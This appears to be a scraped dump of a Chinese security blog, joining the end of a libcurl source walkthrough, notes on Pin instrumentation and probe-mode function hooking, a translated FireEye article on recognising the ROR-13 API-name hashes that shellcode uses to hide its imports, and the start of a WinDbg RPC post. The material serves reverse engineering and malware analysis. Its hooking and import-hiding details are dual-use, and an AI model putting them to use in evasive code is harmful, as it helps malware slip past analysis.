CURLM_STATE_INIT: /* init this transfer. */ result=Curl_pretransfer(data);//各种信息初始化，ssl，cookie if(!result) &#123; /* after init, go CONNECT */ multistate(data, CURLM_STATE_CONNECT);//状态更改 Curl_pgrsTime(data, TIMER_STARTOP); rc = CURLM_CALL_MULTI_PERFORM; &#125; break; case CURLM_STATE_CONNECT: /* Connect. We want to get a connection identifier filled in. */ Curl_pgrsTime(data, TIMER_STARTSINGLE); result = Curl_connect(data, &amp;data-&gt;easy_conn, &amp;async, &amp;protocol_connect); if(CURLE_NO_CONNECTION_AVAILABLE == result) &#123; /* There was no connection available. We will go to the pending state and wait for an available connection. */ multistate(data, CURLM_STATE_CONNECT_PEND); /* add this handle to the list of connect-pending handles */ if(!Curl_llist_insert_next(multi-&gt;pending, multi-&gt;pending-&gt;tail, data)) result = CURLE_OUT_OF_MEMORY; else result = CURLE_OK; break; &#125; if(!result) &#123; /* Add this handle to the send or pend pipeline */ result = Curl_add_handle_to_pipeline(data, data-&gt;easy_conn); if(result) disconnect_conn = TRUE; else &#123; if(async) /* We&apos;re now waiting for an asynchronous name lookup */ multistate(data, CURLM_STATE_WAITRESOLVE); else &#123; /* after the connect has been sent off, go WAITCONNECT unless the protocol connect is already done and we can go directly to WAITDO or DO! */ rc = CURLM_CALL_MULTI_PERFORM; if(protocol_connect) multistate(data, Curl_pipeline_wanted(multi, CURLPIPE_HTTP1)? CURLM_STATE_WAITDO:CURLM_STATE_DO); else &#123; #ifndef CURL_DISABLE_HTTP if(data-&gt;easy_conn-&gt;tunnel_state[FIRSTSOCKET] == TUNNEL_CONNECT) multistate(data, CURLM_STATE_WAITPROXYCONNECT); else #endif multistate(data, CURLM_STATE_WAITCONNECT); &#125; &#125; &#125; &#125; break; case CURLM_STATE_DO://开始发送 /* Perform the protocol&apos;s DO action */ result = multi_do(&amp;data-&gt;easy_conn, &amp;dophase_done); //-&gt; //详细的http请求封装，可以看看这个Curl_http //CURLcode Curl_http(struct connectdata *conn, bool *done)//\\lib\\http.c case CURLM_STATE_DONE: /* post-transfer command */ res = multi_done(&amp;data-&gt;easy_conn, result, FALSE); case CURLM_STATE_PERFORM: /* read/write data if it is ready to do so */ result = Curl_readwrite(data-&gt;easy_conn, data, &amp;done);//接受数据中 //... &#125;while((rc == CURLM_CALL_MULTI_PERFORM) || multi_ischanged(multi, FALSE)); data-&gt;result = result;&#125;//所有状态/* NOTE: if you add a state here, add the name to the statename[] array as well!*/typedef enum &#123; CURLM_STATE_INIT, /* 0 - start in this state */ CURLM_STATE_CONNECT_PEND, /* 1 - no connections, waiting for one */ CURLM_STATE_CONNECT, /* 2 - resolve/connect has been sent off */ CURLM_STATE_WAITRESOLVE, /* 3 - awaiting the resolve to finalize */ CURLM_STATE_WAITCONNECT, /* 4 - awaiting the TCP connect to finalize */ CURLM_STATE_WAITPROXYCONNECT, /* 5 - awaiting proxy CONNECT to finalize */ CURLM_STATE_SENDPROTOCONNECT, /* 6 - initiate protocol connect procedure */ CURLM_STATE_PROTOCONNECT, /* 7 - completing the protocol-specific connect phase */ CURLM_STATE_WAITDO, /* 8 - wait for our turn to send the request */ CURLM_STATE_DO, /* 9 - start send off the request (part 1) */ CURLM_STATE_DOING, /* 10 - sending off the request (part 1) */ CURLM_STATE_DO_MORE, /* 11 - send off the request (part 2) */ CURLM_STATE_DO_DONE, /* 12 - done sending off request */ CURLM_STATE_WAITPERFORM, /* 13 - wait for our turn to read the response */ CURLM_STATE_PERFORM, /* 14 - transfer data */ CURLM_STATE_TOOFAST, /* 15 - wait because limit-rate exceeded */ CURLM_STATE_DONE, /* 16 - post data transfer operation */ CURLM_STATE_COMPLETED, /* 17 - operation complete */ CURLM_STATE_MSGSENT, /* 18 - the operation complete message is sent */ CURLM_STATE_LAST /* 19 - not a true state, never use this */&#125; CURLMstate;//单独看connectCURLcode Curl_connect(struct Curl_easy *data, struct connectdata **in_connect, bool *asyncp, bool *protocol_done)&#123; static CURLcode create_conn(struct Curl_easy *data, struct connectdata **in_connect, bool *async) -&gt; static CURLcode resolve_server(struct Curl_easy *data, struct connectdata *conn, bool *async) &#125; result = Curl_async_resolved(data-&gt;easy_conn, &amp;protocol_connect);-&gt;result = Curl_setup_conn(conn, protocol_done);-&gt;result = Curl_connecthost(conn, conn-&gt;dns_entry);-&gt;result = singleipconnect(conn, conn-&gt;tempaddr[0], &amp;(conn-&gt;tempsock[0]));-&gt;static CURLcode singleipconnect(struct connectdata *conn, const Curl_addrinfo *ai, curl_socket_t *sockp)-&gt;CURLcode Curl_socket(struct connectdata *conn, const Curl_addrinfo *ai, struct Curl_sockaddr_ex *addr, curl_socket_t *sockfd) //Crul对socket等的封装//\\lib\\connect.cCURLcode Curl_socket(struct connectdata *conn, const Curl_addrinfo *ai, struct Curl_sockaddr_ex *addr, curl_socket_t *sockfd)CURLcode Curl_connecthost(struct connectdata *conn, /* context */ const struct Curl_dns_entry *remotehost) int Curl_closesocket(struct connectdata *conn, curl_socket_t sock)curl_socket_t Curl_getconnectinfo(struct Curl_easy *data, struct connectdata **connp) 3. 接受数据时1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162static CURLMcode multi_runsingle(struct Curl_multi *multi, struct timeval now, struct Curl_easy *data)//\\lib\\multi.c-&gt;CURLcode Curl_readwrite(struct connectdata *conn, struct Curl_easy *data, bool *done)//\\lib\\transfer.c&#123; /* We go ahead and do a read if we have a readable socket or if the stream was rewound (in which case we have data in a buffer) */ if((k-&gt;keepon &amp; KEEP_RECV) &amp;&amp; ((select_res &amp; CURL_CSELECT_IN) || conn-&gt;bits.stream_was_rewound)) &#123; result = readwrite_data(data, conn, k, &amp;didwhat, done);// if(result || *done) return result; &#125;&#125;-&gt;static CURLcode readwrite_data(struct Curl_easy *data, struct connectdata *conn, struct SingleRequest *k, int *didwhat, bool *done)//\\lib\\transfer.c&#123; //接受头部 result = Curl_http_readwrite_headers(data, conn, &amp;nread, &amp;stop_reading); //-&gt; //CURLcode Curl_client_write(struct connectdata *conn, // int type, // char *ptr, // size_t len)//lib\\sendf.c //接受数据 result = Curl_client_write(conn, CLIENTWRITE_BODY, k-&gt;str, nread); //-》 //Curl_client_write-&gt;Curl_client_chop_write-&gt; 调用回调函数 // &#125;//调用回调函数CURLcode Curl_client_chop_write(struct connectdata *conn, int type, char * ptr, size_t len)&#123; curl_write_callback writeheader = NULL; curl_write_callback writebody = NULL; //... /* Determine the callback(s) to use. */ if(type &amp; CLIENTWRITE_BODY) writebody = data-&gt;set.fwrite_func; if(writebody) &#123; //调用回调函数 size_t wrote = writebody(ptr, 1, chunklen, data-&gt;set.out);&#125; 4. cookie相关123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103//解析指定的cookie文件//支持# Netscape HTTP Cookie File和Mozilla cookieCURLcode Curl_pretransfer(struct Curl_easy *data)//lib\\transfer.c&#123; /* If there is a list of cookie files to read, do it now! */ if(data-&gt;change.cookielist)//cookie文件列表 Curl_cookie_loadfiles(data);&#125;-&gt;void Curl_cookie_loadfiles(struct Curl_easy *data)//lib\\cookie.c-&gt;//读取cookie文件，初始化cookie结构struct CookieInfo *Curl_cookie_init(struct Curl_easy *data, const char *file, struct CookieInfo *inc, bool newsession)//lib\\cookie.c-&gt;//lineptr是从cookie.txt中读取的每行数据，解析数据，插入CookieInfo链struct Cookie *Curl_cookie_add(struct Curl_easy *data, /* The &apos;data&apos; pointer here may be NULL at times, and thus must only be used very carefully for things that can deal with data being NULL. Such as infof() and similar */ struct CookieInfo *c, bool httpheader, /* TRUE if HTTP header-style line */ char *lineptr, /* first character of the line */ const char *domain, /* default domain */ const char *path) /* full path used when this cookie is set, used to get default path for the cookie unless set */&#123;//...clist = c-&gt;cookies; replace_old = FALSE; while(clist) &#123; if(Curl_raw_equal(clist-&gt;name, co-&gt;name)) &#123; /* the names are identical */ if(clist-&gt;domain &amp;&amp; co-&gt;domain) &#123; if(Curl_raw_equal(clist-&gt;domain, co-&gt;domain)) /* The domains are identical */ replace_old=TRUE; &#125; else if(!clist-&gt;domain &amp;&amp; !co-&gt;domain) replace_old = TRUE; if(replace_old) &#123; /* the domains were identical */ if(clist-&gt;spath &amp;&amp; co-&gt;spath) &#123; if(Curl_raw_equal(clist-&gt;spath, co-&gt;spath)) &#123; replace_old = TRUE; &#125; else replace_old = FALSE; &#125; else if(!clist-&gt;spath &amp;&amp; !co-&gt;spath) replace_old = TRUE; else replace_old = FALSE; &#125; //。。。 if(replace_old) &#123; co-&gt;next = clist-&gt;next; /* get the next-pointer first */ *clist = *co; /* then store all the new data */ free(co); /* free the newly alloced memory */ co = clist; /* point to the previous struct instead */ /* We have replaced a cookie, now skip the rest of the list but make sure the &apos;lastc&apos; pointer is properly set */ do &#123; lastc = clist; clist = clist-&gt;next; &#125; while(clist); break; &#125; &#125; lastc = clist; clist = clist-&gt;next; &#125; if(c-&gt;running) /* Only show this when NOT reading the cookies from a file */ infof(data, &quot;%s cookie %s=\\&quot;%s\\&quot; for domain %s, path %s, &quot; &quot;expire %&quot; CURL_FORMAT_CURL_OFF_T &quot;\\n&quot;, replace_old?&quot;Replaced&quot;:&quot;Added&quot;, co-&gt;name, co-&gt;value, co-&gt;domain, co-&gt;path, co-&gt;expires); if(!replace_old) &#123; /* then make the last item point on this new one */ if(lastc) lastc-&gt;next = co; else c-&gt;cookies = co; c-&gt;numcookies++; /* one more cookie in the jar */ &#125; //...&#125; 0x06. 其他封装了一份简单的http类，支持GET、POST、ajax，代码比较简单，有需要的可以拿来用，后续可能会更新 源码：https://github.com/anhkgg/minihttp https://curl.haxx.se/libcurl/ https://curl.haxx.se/libcurl/3 http://blog.csdn.net/breaksoftware/article/details/45874197 转载请注明出处：http://anhkgg.github.io/liburl-use-minihttp/","tags":[{"name":"libcurl","slug":"libcurl","permalink":"https://anhkgg.github.io/tags/libcurl/"},{"name":"http","slug":"http","permalink":"https://anhkgg.github.io/tags/http/"},{"name":"minihttp","slug":"minihttp","permalink":"https://anhkgg.github.io/tags/minihttp/"},{"name":"get_post_ajax","slug":"get-post-ajax","permalink":"https://anhkgg.github.io/tags/get-post-ajax/"}]},{"title":"pin使用小记-函数分析","date":"2016-07-28T05:27:33.000Z","path":"pin-use-note-function-analysis/","text":"概述相关：pin是什么 pin可以做什么 pin examples 此次使用pin目的，是为了能够应用pin在函数分析方面的功能，以及XXXInsertCall的功能 由于此前对pin了解不够深入，以为可以实现相应功能，哪知撞了南墙才知道pin也有些许局限。 下面将我对了解到的pin可以实现以及不能实现的各种坑写作笔记。 函数分析RTN1PIN_CALLBACK LEVEL_PINCLIENT::RTN_AddInstrumentFunction (RTN_INSTRUMENT_CALLBACK fun, VOID *val) 使用RTN_AddInstrumentFunction即可对分析目标添加函数级插桩，在设置的回调中可以获取函数的各种信息。 1typedef VOID(*) LEVEL_PINCLIENT::RTN_INSTRUMENT_CALLBACK(RTN rtn, VOID *v) 回调函数中rtn就表示被插桩的该函数，通过RTN_XXX相关函数可以获取函数的名字、地址、大小、范围等等 1234const string &amp; LEVEL_PINCLIENT::RTN_Name (RTN x)ADDRINT LEVEL_PINCLIENT::RTN_Address (RTN rtn)USIZE LEVEL_PINCLIENT::RTN_Size (RTN rtn)USIZE LEVEL_PINCLIENT::RTN_Range (RTN rtn) 不得不提一个函数，RTN_FindByName类似于GetProcAddress，可以获取img(模块对象)中指定名字的rtn对象。 1RTN LEVEL_PINCLIENT::RTN_FindByName (IMG img, const CHAR *name) 也可以通过地址来获取对应的rtn对象，但是如果对应函数没有符号信息，获取到的rtn是不对的，会找到最小范围内满足的rtn对象 1RTN LEVEL_PINCLIENT::RTN_FindByAddress (ADDRINT address) 函数初以为RTN表示所有函数对象，像IDA一样能将基本所有函数分析出来，哪知吃了不看文档的亏(虽然知道使用RTN之前需要调用符号相关初始化)。 A RTN represents the functions/routines/procedures typically produced by a compiler for a procedural programming language such as C. Pin finds routines by using the symbol table information. You must call PIN_InitSymbols() so that symbol table information will be available. Can be accessed at instrumentation time and analysis time. 也就是说pin是根据符号信息来分析函数，生成RTN对象。那么没有符号信息的函数，像IDA中的是那么sub_xxxx也就没有可能这么方便的使用了。 当然，如果需求是对有符号信息的函数，比如对系统函数的分析，那么RTN还是能够提供相当nb的功能的。记得调用PIN_InitSymbols()初始化符号信息。 maybe hookpin可以实现类似于对函数hook的功能，有两类，第一类用在JIT模式下，另一类用在Probe模式下。 先说JIT模式下使用的RTN_InsertCall。 12345VOID LEVEL_PINCLIENT::RTN_InsertCall ( RTN rtn,IPOINT action,AFUNPTR funptr, ... ) Insert call relative to a rtn. 使用这个函数注册一个回调函数，该回调函数可以在rtn调用前（IPOINT_BEFORE）或者调用后（IPOINT_AFTER）被调用。可以给回调函数传递各种信息，使用第三个参数之后的内容传递。 pin中各种XXX_InsertCall传递参数有一个统一的类型IARG_TYPE。这里简单说一下传递方法，具体要根据IARG_TYPE说明来使用，大致分为两种： 只需要指定IARG_XXX类型，pin自己传递具体值给回调函数 指定IARG_XXX类型，开发者传递类型对应的具体值 必须以IARG_END表示参数结束。 123456789101112//pin传递值，只需要指定类型即可IARG_RETURN_IP Type: ADDRINT. Return address for function call, valid only at the function entry point.IARG_ORIG_FUNCPTR Type: AFUNPTR. Function pointer to the relocated entry of the original uninstrumented function.IARG_PROTOTYPE Type: PROTO. The function prototype of the application function. See Prototypes.IARG_THREAD_ID Type: THREADID. Application thread id.//开发者需要自己传递具体值IARG_ADDRINT Type: ADDRINT. Constant value (additional arg required).IARG_PTR Type: &quot;VOID *&quot;. Constant value (additional pointer arg required).IARG_BOOL Type: BOOL. Constant (additional BOOL arg required).IARG_UINT32 Type: UINT32. Constant (additional integer arg required).IARG_INST_PTR Type: ADDRINT. The address of the instrumented instruction. This value does not change at IPOINT_AFTER. This is simply shorthand for IARG_ADDRINT, INS_Address(ins).IARG_REG_VALUE Type: ADDRINT for integer register. Value of a register (additional register arg required) REG: Register Object Basically, this cannot be used to retrieve the value of registers whose size is different than ADDRINT&apos;s (i.e.: x87/XMM/YMM/ZMM registers) or registeres which are not architectural (REG_PIN_*), but there are some exceptions for this rule. 举个例子：1234567891011121314char* p = &quot;this is log info.&quot;;BOOL log_falg = TRUE;ADDRINT addr = RTN_Address(rtn);RTN_InsertCall(rtn, IPOINT_BEFORE, RtnClk, IARG_ORIG_FUNCPTR, IARG_RETURN_IP, IARG_ADDRINT, addr, IARG_PTR, p, IARG_BOOL, log_falg, IARG_END); VOID RtnClk(ADDRINT OrigFunc, ADDRINT retIp, ADDRINT addr, void* log, BOOL log_falg)&#123;&#125; Probe模式下使用下面两个函数，其实没有弄明白这两个函数和JIT模式下RTN_InserCall的区别，暂时就不做深入了。 12VOID LEVEL_PINCLIENT::RTN_InsertCallProbed (RTN orgRtn, IPOINT action, AFUNPTR funptr,...)VOID LEVEL_PINCLIENT::RTN_InsertCallProbedEx (RTN orgRtn, IPOINT action, PROBE_MODE mode, AFUNPTR funptr,...) Insert a call to an analysis routine relative to a RTN. 其他12RTN_ReplaceProbedRTN_ReplaceProbedEx 下面一个示例，可能更符合对函数hook的理解，这里使用到的是RTN_ReplaceSignatureProbed 这种方式需要向函数hook一样指定函数原型，也就是需要知道函数需要哪些参数，调用方式等等。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657typedef VOID * ( *FP_MALLOC )( size_t );// This is the replacement routine.//VOID * NewMalloc( FP_MALLOC orgFuncptr, UINT32 arg0, ADDRINT returnIp )&#123; // Normally one would do something more interesting with this data. // cout &lt;&lt; &quot;NewMalloc (&quot; &lt;&lt; hex &lt;&lt; ADDRINT ( orgFuncptr ) &lt;&lt; &quot;, &quot; &lt;&lt; dec &lt;&lt; arg0 &lt;&lt; &quot;, &quot; &lt;&lt; hex &lt;&lt; returnIp &lt;&lt; &quot;)&quot; &lt;&lt; endl &lt;&lt; flush; // Call the relocated entry point of the original (replaced) routine. // VOID * v = orgFuncptr( arg0 ); return v;&#125;// Pin calls this function every time a new img is loaded.// It is best to do probe replacement when the image is loaded,// because only one thread knows about the image at this time.//VOID ImageLoad( IMG img, VOID *v )&#123; // See if malloc() is present in the image. If so, replace it. // RTN rtn = RTN_FindByName( img, &quot;malloc&quot; ); if (RTN_Valid(rtn)) &#123; cout &lt;&lt; &quot;Replacing malloc in &quot; &lt;&lt; IMG_Name(img) &lt;&lt; endl; // Define a function prototype that describes the application routine // that will be replaced. // PROTO proto_malloc = PROTO_Allocate( PIN_PARG(void *), CALLINGSTD_DEFAULT, &quot;malloc&quot;, PIN_PARG(int), PIN_PARG_END() ); // Replace the application routine with the replacement function. // Additional arguments have been added to the replacement routine. // RTN_ReplaceSignatureProbed(rtn, AFUNPTR(NewMalloc), IARG_PROTOTYPE, proto_malloc, IARG_ORIG_FUNCPTR, IARG_FUNCARG_ENTRYPOINT_VALUE, 0, IARG_RETURN_IP, IARG_END); // Free the function prototype. // PROTO_Free( proto_malloc ); &#125;&#125; can be hook另外pin还提供对任意地址做hook的函数，也就是PIN_InsertCallProbed。 显然这也是用于Probe模式下的函数，顺便就说一下Probe模式下需要注意，调用PIN_StartProgramProbed()启动目标进程，这样子之后，JIT模式的很多函数就不能使用了。正是因为这个，如RTN、INS、Trace插桩函数不能使用，只能通过IMG插桩，在回调中进行函数的分析，想下面的实例代码中一样。 这样就给我要实现的功能带来了麻烦，无法通过INS插桩分析call xxx的目标地址，更别说后续的使用PIN_InsertCallProbed来对函数hook了，这样子PIN_InsertCallProbed对我来说显得很鸡肋。 PIN_StartProgramProbed() must be used when using this API.Use RTN_IsSafeForProbedInsertion() to determine if a function is a suitable candidate for probed function insertion. 不过，我觉得这种模式更类似于函数hook，不会像上面指定IPOINT_BEFORE，它更像hook一样只是对函数进行inline hook（或者其他方式）。 使用示例(代码来自于pin例子源码source\\tools\\Probes\\insert_call_probed.cpp)： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859void Notification(ADDRINT val)&#123; char buff[80]; if (!writeFun) &#123; fprintf(stderr, &quot;Write Function was not initialized ...\\n&quot;); exit(1); &#125; sprintf(buff, &quot;Notification value: %p&quot;, Addrint2VoidStar(val)); writeFun(buff);&#125;VOID ImageLoad(IMG img, VOID *v)&#123; const ANNOTATION *ann = 0; USIZE num = 0; printf(&quot;Processing %s\\n&quot;, IMG_Name(img).c_str()); for (SEC sec = IMG_SecHead(img); SEC_Valid(sec); sec = SEC_Next(sec)) &#123; if (SEC_Name(sec) == &quot;MyAnnot&quot;) &#123; ann = reinterpret_cast&lt;const ANNOTATION*&gt;(SEC_Data(sec)); num = SEC_Size(sec) / sizeof(ANNOTATION); &#125; &#125; if (ann) &#123; printf(&quot;Found annotations: \\n&quot;); for (UINT32 i = 0; i &lt; num; i++) &#123; ADDRINT addr = ann[i].addr + IMG_LoadOffset(img); ADDRINT val = ann[i].value; printf(&quot;\\t%p %p\\t&quot;, Addrint2VoidStar(addr), Addrint2VoidStar(val)); if (PIN_IsSafeForProbedInsertion(addr)) //检查addr对应指令是否可以做hook &#123; PIN_InsertCallProbed(addr, AFUNPTR(Notification), IARG_ADDRINT, val, IARG_END); printf(&quot; - OK\\n&quot;); &#125; else &#123; printf(&quot; - Failed\\n&quot;); &#125; &#125; // Set the write line function, from the image of the annotations (i.e. the main executable). RTN writeRtn = RTN_FindByName(img, &quot;write_line&quot;); if (RTN_Valid(writeRtn)) &#123; writeFun = (void (*)(char *))RTN_Funptr(writeRtn); &#125; &#125; printf(&quot;Completed %s\\n&quot;, IMG_Name(img).c_str());&#125; INSINS表示某地址对应的指令对象，通过INS_XXX函数可以获取指令对应汇编代码，可以判断指令时什么类型，也可以对INS进行插桩。 An INS represents an instruction. Can only be accessed at instrumentation time. 下面列出一部分函数，看名字就知道干什么的。 123456789101112131415161718192021string LEVEL_CORE::INS_Disassemble (INS ins)BOOL LEVEL_CORE::INS_IsLea (INS ins)BOOL LEVEL_CORE::INS_IsNop (INS ins)BOOL LEVEL_CORE::INS_IsCall (INS ins)BOOL LEVEL_CORE::INS_IsProcedureCall (INS ins)BOOL LEVEL_CORE::INS_IsRet (INS ins)BOOL LEVEL_CORE::INS_IsSysret (INS ins)BOOL LEVEL_CORE::INS_IsSyscall (INS ins)ADDRINT LEVEL_PINCLIENT::INS_Address (INS ins)USIZE LEVEL_PINCLIENT::INS_Size (INS ins)RTN LEVEL_PINCLIENT::INS_Rtn (INS x)BOOL LEVEL_CORE::INS_IsBranch (INS ins)BOOL LEVEL_CORE::INS_IsDirectBranch (INS ins)BOOL LEVEL_CORE::INS_IsDirectCall (INS ins)BOOL LEVEL_CORE::INS_IsDirectBranchOrCall (INS ins)BOOL LEVEL_CORE::INS_IsBranchOrCall (INS ins)BOOL LEVEL_CORE::INS_IsIndirectBranchOrCall (INS ins)ADDRINT LEVEL_PINCLIENT::INS_DirectBranchOrCallTargetAddress (INS ins) 下面主要对用到的几个函数，对其理解做一下笔记。 call/branch上面提到我要对call xxx中xxx的信息进行获取，就需要用到对INS的分析，进而通过插桩来获取地址。 用到了下面几个函数对指令进行判断，是否是call。 1234567891011121314151617181920BOOL LEVEL_CORE::INS_IsCall (INS ins)//call，不管目标是不是地址，或者寄存器等BOOL LEVEL_CORE::INS_IsBranch (INS ins) //jmp,jz,jnz等等，不管目标是不是地址，或者寄存器等BOOL LEVEL_CORE::INS_IsDirectBranch (INS ins)//jmp,jz,jnz等等，目标是地址BOOL LEVEL_CORE::INS_IsDirectCall (INS ins)//call xxx，目标是地址BOOL LEVEL_CORE::INS_IsDirectBranchOrCall (INS ins)//call,jmp,jz,jnz等等，目标是地址BOOL LEVEL_CORE::INS_IsBranchOrCall (INS ins)//call,jmp,jz,jnz等等，不管目标是不是地址，或者寄存器等BOOL LEVEL_CORE::INS_IsIndirectBranchOrCall (INS ins)//call,jmp,jz,jnz等等，目标是寄存器 目标地址如果INS满足INS_IsDirectBranchOrCall，可以直接通过INS_DirectBranchOrCallTargetAddress获取到目标地址。 如果INS是INS_IsIndirectBranchOrCall，那么只有通过插桩来获取目标地址。插桩是必须使用IPOINT_TAKEN_BRANCH类型的action，然后再回调函数中可以通过寄存器来获取目标地址。 如下所示代码： 1234567INS_InsertCall(ins, IPOINT_TAKEN_BRANCH, (AFUNPTR)RttiCall, IARG_CONTEXT, IARG_INST_PTR, IARG_END);void RttiCall(CONTEXT* ctx, ADDRINT addr)&#123; ADDRINT TakenIP = (ADDRINT)PIN_GetContextReg(ctx, REG_INST_PTR); ADDRINT RIP = (ADDRINT)PIN_GetContextReg(ctx, REG_RIP);&#125; 总结通过上面对RNT，INS使用的相关总结，已经可以拿到call xxx的目标地址，也可以对任意地址进行插桩（hook），但是就在JIT\\Probe两个模式中找不到可以以结合的地方。 JIT模式下，可以通过INS拿到目标地址，但是不能对目标地址进行插桩 Probe模式下，可以对目标地址插桩，但是拿不到目标地址 不知道pin是否可以满足这种需求，但在我目前看到的东西里，是没法实现了。 如果有过路的高人，想可以指点一二，不甚感激。 另外总结一下pin中各对象的关系：1IMG-&gt;SEC-&gt;BBL-&gt;RTN-&gt;INS 完结。","tags":[{"name":"pin","slug":"pin","permalink":"https://anhkgg.github.io/tags/pin/"},{"name":"pintool","slug":"pintool","permalink":"https://anhkgg.github.io/tags/pintool/"},{"name":"function analysis","slug":"function-analysis","permalink":"https://anhkgg.github.io/tags/function-analysis/"},{"name":"hook","slug":"hook","permalink":"https://anhkgg.github.io/tags/hook/"},{"name":"insertcall","slug":"insertcall","permalink":"https://anhkgg.github.io/tags/insertcall/"},{"name":"instrument","slug":"instrument","permalink":"https://anhkgg.github.io/tags/instrument/"},{"name":"asm","slug":"asm","permalink":"https://anhkgg.github.io/tags/asm/"},{"name":"插桩","slug":"插桩","permalink":"https://anhkgg.github.io/tags/插桩/"},{"name":"钩子","slug":"钩子","permalink":"https://anhkgg.github.io/tags/钩子/"},{"name":"指令级","slug":"指令级","permalink":"https://anhkgg.github.io/tags/指令级/"}]},{"title":"使用预先算好的字符串hash逆向分析shellcode","date":"2016-07-11T10:29:16.000Z","path":"precalculated-string-hashes-reverse-engineering-shellcode/","text":"前言对fireeye关于ida中shellcode_hashes_search_plugin.py的文章翻译，原文链接是USING PRECALCULATED STRING HASHES WHEN REVERSE ENGINEERING SHELLCODE 文章是fireeye的Jay Smith写的，介绍说经常在分析恶意样本中遇到shellcode，文章会介绍shellcode导入技术的背景以及如何是IDA自动化标记来更快分析shellcode 逆向shellcode判断一段shellcode做了什么，最简单的方法是将其放在一个监控环境中运行。但是如果shellcode是被exploit加载并且你没有对应版本的可利用程序，这种方式就没什么用了。在我们研究shellcode的经验中，我们发现很多恶意样本含有一段嵌入的shellcode，样本将shellcode注入到其他进程中执行。然而，获取到这段嵌入的shellcode，让他运行起来，并不总是可用的。在这些情况下，就需要静态分析shellcode来看看它有些什么功能了。 Shellcode的二进制文件一般都不是很大，所以逆向它们并不是很难，但是通常shellcode作者会使用一些技术手段来阻碍逆向分析。其中一种技术就是使用API函数名的hash来手工导入函数。 shellcode导入技术开发者编写正常的程序通常使用kernel32.dll的LoadLibraryA和GetProcAddress来加载任意DLL和获取它们的到处函数地址。而shllcode的作者经常遇到内存大小限制，所以如果在代码中使用API函数名的完整字符串是不大可能的。相对于使用完整函数名字符串，预先计算好函数名的hash值，保存到shellcode中，花费更少的内存大小。使用这种方式的话，shellcode就不能使用GetProcAddress来获取函数地址了，需要解析DLL的PE文件找到导出目录，解析到处函数数组。对每个函数名字，计算出它的hash值，对比先前保存在shellcode中的hash值，如果相等就找到了对应的API函数。关于这种技术的背景资料可以在Last Stage的winasm项目中公开的paper中找到。 这种技术听起来很难，但是幸运的是shellcode作者大都会重用已知的hash算法和值，这样逆向分析就更简单了。我所见过的大部分shellcode样本的hash算法都被metasploit收录了。这个算法如下： 12345acc := 0for c in input_string do acc := ROR(acc, 13); acc := acc + c;end 这个肯定不是一个很强的hash算法，但是它已经完全可以达到将任意长度的输入字符串计算成一个整数的目的。这个算法唯一的限制是开发者使用的每一个API函数都有唯一的hash值，算法中简单的ROR-13是很有效的。我见过的不一样的hash算法通常只是将这个算法进行了轻微的修改：位移一个不同的值，将右移换成左移，或者使用其他方法将输入的所有字符串混合成一个整数值。 自动标记shellcode导入当你第一次逆向shellcode的时候，你通常可能在网上搜搜这些魔数，或者自己计算这些值保存在文本中以后使用。很长一段时间，我看了很多的样本，我意思到这是一个烦人且重复的工作，该使用IDA脚本进行自动化。 由于shellcode作者重用通用的代码，我觉得公开我的IDA脚本集对恶意代码分析有帮助。预先用已知的hash算法计算出重用API函数名的hash后，如果有新的hash算法出现，就不难实现它来产生hash值了。在Poison Ivy RAT的字符串hash，有过这种情况（这句原文：There has only been one instance, involving string hash from Poison Ivy RAT, in which this wasn’t the case）。 可以在https://github.com/mandiant/Reversing找到脚本。 有两个部分： make_sc_hash_db.py 是用于预先计算函数名字的hash值。这是一个实现了我以前遇到过的hash算法的命令行python脚本。它处理了一个目录中的所有DLL，计算了每个到处函数的hash值，保存在SQLite数据库中。 shellcode_hash_search.py 是一个IDAPython脚本，用来打开SQLite数据库，获取其中预先计算的hash值，在当前文件中搜索已知的hash值。 make_sc_hash_db.py可以像下面那样使用，第一个参数是要创建的数据库名字，第二个参数是保存DLL的目录。如果你跳过这个步骤，发布版本中已经有个简单的数据库了。 1python make_sc_hash_db.py sc_hashes.db /customer/microsoft/shellcode_dlls/ 当shellcode_hash_search.py运行起来后，提示用户使用哪个数据库，然后询问用户其他的搜索参数。它显示所有的保存在数据库中的hash算法，然后提供一些简单的已知的伪代码，如图： 脚本会尝试使用HexRays发布的用于QT的PySide(可以在这里下载http://www.hex-rays.com/products/ida/support/download.shtml)))。如果HexRays中没有PySide，它使用简单的对话框来或者相同的信息。 如果没有任何信息被高亮，脚本搜索当前段或者高亮区域。脚本查询每个DWORD（选中了DWORD Array选项），每个指令操作数（选中了Instr Operands选项）来决定是不是选中算法的一个hash值。如果找到了一个hash值会有一个line comment。如图： 有些shellcode作者也经常使用hash值保存在DWORD数组中，而不是将每个值压入函数参数，如图： 如果选中了Create Struct，如果找到的hash值在一段连续地址，脚本会自动创建一个结构体，如图： 如果shellcode作者使用函数指针数组，结构体非常有用，它会转换成[base+index]的结构体引用。如图： shellcode_hashes_search_plugin.py用来显示IDA插件菜单的。拷贝到%PROGRAMFILES%IDAplugins，设置其他python文件到PATH环境变量中确保可被使用。 总结通常，逆向分析一个shellcode比正常的binary文件更加乏味。IDA的导入表分析缺陷是一个延长分析的很大原因。通过IDAPython脚本可以解决上面的问题，我们已经将脚本公开在githun，希望你们的shellcode分析能够得到改进。 参考: USING PRECALCULATED STRING HASHES WHEN REVERSE ENGINEERING SHELLCODE 转载请注明出处，谢谢！","tags":[{"name":"reverse","slug":"reverse","permalink":"https://anhkgg.github.io/tags/reverse/"},{"name":"shellcode","slug":"shellcode","permalink":"https://anhkgg.github.io/tags/shellcode/"},{"name":"IDAPython","slug":"IDAPython","permalink":"https://anhkgg.github.io/tags/IDAPython/"}]},{"title":"Windbg系列-RPC调试","date":"2016-01-04T12:16:10.000Z","path":"Windbg系列-RPC调试/","text":"概述最近在调试rpc，没法子，翻译了一下windbg这篇调试RPC的文档，后面可能还有其他内容，也就弄个系列吧算是自己的笔记，有看客的话，可以多多指出问题，提提建议，不吝赐教！ 